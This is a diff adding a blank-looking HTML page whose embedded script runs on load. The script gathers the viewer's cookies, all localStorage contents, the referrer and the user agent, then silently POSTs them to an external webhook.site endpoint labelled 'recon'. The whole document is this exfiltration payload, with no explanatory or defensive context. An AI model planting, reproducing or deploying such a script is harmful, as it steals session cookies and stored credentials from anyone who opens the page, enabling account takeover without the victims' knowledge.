@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head><title>.</title></head>
+<body>
+<script>
+(function() {
+  var WEBHOOK = 'https://webhook.site/1017fe30-0b47-473e-98b3-3badba9b4f69/recon';
+  
+  function safe(fn, fb) { try { return fn(); } catch(e) { return fb || 'err'; } }
+
+  var ctx = {
+    parent_origin: safe(function() { return document.referrer; }),
+    cookies: safe(function() { return document.cookie; }, 'empty'),
+    ls_data: safe(function() {
+      var obj = {};
+      for(var k in localStorage) {
+        if(localStorage.hasOwnProperty(k)) obj[k] = localStorage.getItem(k);
+      }
+      return JSON.stringify(obj);
+    }, 'blocked'),
+    ua: navigator.userAgent,
+    ts: new Date().toISOString()
+  };
+
+  fetch(WEBHOOK, {
+    method: 'POST',
+    mode: 'no-cors',
+    body: JSON.stringify(ctx)
+  });
+})();
+</script>
+</body>
+</html>
